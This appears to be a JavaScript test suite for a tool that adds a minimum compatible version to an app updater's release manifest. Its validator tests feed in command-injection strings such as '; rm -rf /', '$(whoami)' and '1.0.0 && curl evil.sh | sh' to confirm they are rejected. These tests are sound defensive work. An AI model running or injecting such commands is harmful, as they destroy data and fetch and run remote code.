import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  isSyntacticVersion,
  parseManifest,
  readTrackedMinimum,
  validateMinimumVersion,
  mergeMinimumVersion,
} from './stamp-updater-compatibility.mjs';

const baseManifest = {
  version: '1.2.0',
  notes: 'Some release notes',
  pub_date: '2026-07-11T00:00:00Z',
  platforms: {
    'darwin-aarch64': { signature: 'sig-a', url: 'https://example.com/a.dmg.tar.gz' },
    'linux-x86_64': { signature: 'sig-b', url: 'https://example.com/b.AppImage.tar.gz' },
  },
};

describe('parseManifest', () => {
  it('parses valid manifest JSON', () => {
    const text = JSON.stringify(baseManifest);
    assert.deepEqual(parseManifest(text), baseManifest);
  });

  it('throws a clear error on invalid JSON', () => {
    assert.throws(() => parseManifest('{not json'), /Could not parse manifest JSON/);
  });
});

describe('readTrackedMinimum', () => {
  it('returns the tracked value when present', () => {
    assert.equal(readTrackedMinimum({ minimumCompatibleVersion: '0.3.0' }), '0.3.0');
  });

  it('throws when the key is missing', () => {
    assert.throws(() => readTrackedMinimum({}), /missing a 'minimumCompatibleVersion'/);
  });

  it('throws when the config itself is missing', () => {
    assert.throws(() => readTrackedMinimum(null), /missing a 'minimumCompatibleVersion'/);
  });
});

describe('validateMinimumVersion', () => {
  it('accepts a minimum below the manifest version', () => {
    assert.equal(validateMinimumVersion('1.0.0', baseManifest), '1.0.0');
  });

  it('accepts a minimum equal to the manifest version', () => {
    assert.equal(validateMinimumVersion('1.2.0', baseManifest), '1.2.0');
  });

  it('rejects a minimum greater than the manifest version', () => {
    assert.throws(() => validateMinimumVersion('1.3.0', baseManifest), /greater than the release version/);
  });

  it('rejects an unparseable minimum', () => {
    assert.throws(() => validateMinimumVersion('not-a-version', baseManifest), /not a valid semantic version/);
  });

  it('rejects a missing minimum value', () => {
    assert.throws(() => validateMinimumVersion(undefined, baseManifest), /not a valid semantic version/);
  });

  it('tolerates and normalizes a leading v on the minimum', () => {
    assert.equal(validateMinimumVersion('v1.0.0', baseManifest), '1.0.0');
  });

  it('tolerates and normalizes a leading v on the manifest version', () => {
    const manifest = { ...baseManifest, version: 'v1.2.0' };
    assert.equal(validateMinimumVersion('1.2.0', manifest), '1.2.0');
  });

  it('rejects values containing shell metacharacters before touching the manifest', () => {
    for (const malicious of ['; rm -rf /', '$(whoami)', '`whoami`', '1.0.0; rm -rf /', '1.0.0 && curl evil.sh | sh']) {
      assert.throws(
        () => validateMinimumVersion(malicious, baseManifest),
        /not a valid semantic version/,
        `expected rejection for: ${malicious}`,
      );
    }
  });

  it('an override value passes through the exact same validator as the tracked value', () => {
    const trackedValue = readTrackedMinimum({ minimumCompatibleVersion: '1.0.0' });
    const overrideValue = '1.1.0';
    // Precedence is a caller concern (override wins over tracked); both are
    // just strings fed through the same validator with no special-casing.
    assert.equal(validateMinimumVersion(overrideValue, baseManifest), '1.1.0');
    assert.equal(validateMinimumVersion(trackedValue, baseManifest), '1.0.0');
  });
});

describe('isSyntacticVersion', () => {
  it('accepts plain and v-prefixed semver strings', () => {
    assert.equal(isSyntacticVersion('1.2.3'), true);
    assert.equal(isSyntacticVersion('v1.2.3'), true);
    assert.equal(isSyntacticVersion('1.2.3-beta.1'), true);
  });

  it('rejects shell metacharacters and garbage', () => {
    assert.equal(isSyntacticVersion('; rm -rf /'), false);
    assert.equal(isSyntacticVersion('$(whoami)'), false);
    assert.equal(isSyntacticVersion('`whoami`'), false);
    assert.equal(isSyntacticVersion('not-a-version'), false);
    assert.equal(isSyntacticVersion(''), false);
    assert.equal(isSyntacticVersion(undefined), false);
  });
});

describe('mergeMinimumVersion', () => {
  it('preserves every existing field byte-for-byte and adds exactly one key', () => {
    const merged = mergeMinimumVersion(baseManifest, '1.0.0');
    assert.equal(merged.version, baseManifest.version);
    assert.equal(merged.notes, baseManifest.notes);
    assert.equal(merged.pub_date, baseManifest.pub_date);
    assert.deepEqual(merged.platforms, baseManifest.platforms);
    assert.equal(merged.minimum_compatible_version, '1.0.0');
    assert.equal(Object.keys(merged).length, Object.keys(baseManifest).length + 1);
  });

  it('does not mutate the input manifest', () => {
    const clone = JSON.parse(JSON.stringify(baseManifest));
    mergeMinimumVersion(clone, '1.0.0');
    assert.deepEqual(clone, baseManifest);
  });

  it('is idempotent: re-stamping replaces rather than duplicates the key', () => {
    const stampedOnce = mergeMinimumVersion(baseManifest, '1.0.0');
    const stampedTwice = mergeMinimumVersion(stampedOnce, '1.1.0');
    assert.equal(stampedTwice.minimum_compatible_version, '1.1.0');
    assert.equal(Object.keys(stampedTwice).length, Object.keys(baseManifest).length + 1);
  });
});
